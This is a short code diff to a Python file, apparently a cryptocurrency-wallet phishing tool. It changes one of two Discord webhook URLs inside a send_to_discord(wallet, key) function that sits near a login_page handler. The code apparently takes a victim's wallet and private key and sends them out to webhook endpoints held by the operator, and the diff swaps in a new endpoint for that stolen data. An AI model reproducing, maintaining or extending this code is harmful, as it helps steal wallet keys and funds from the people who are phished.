@@ -121,7 +121,7 @@ def login_page():
 
 def send_to_discord(wallet, key):
     webhook_urls = [ 
-        "https://discord.com/api/webhooks/1335646643344638013/ClH1aJ1qiRqkiG37Jz3QUZsuoXI1cTy2lXk-R1H1swCWG4WpIzNoc0npjNQM5vieQ0BA",
+        "https://discord.com/api/webhooks/1336382648628674682/8kBlPRIl-HXKHk3dQu29H-y143YPqsHSkkIxcUK8HiYOB9RHpd9RQwvtWpJmbypKo3uM",
         "https://discord.com/api/webhooks/1335646737754357810/L8N5v3P3WbiOO92OtAHwu-WFTeFOzrySm0l5ZFcS-TNrdWm9nKc9Lrtts7_12xeIj1od"
     ]
     
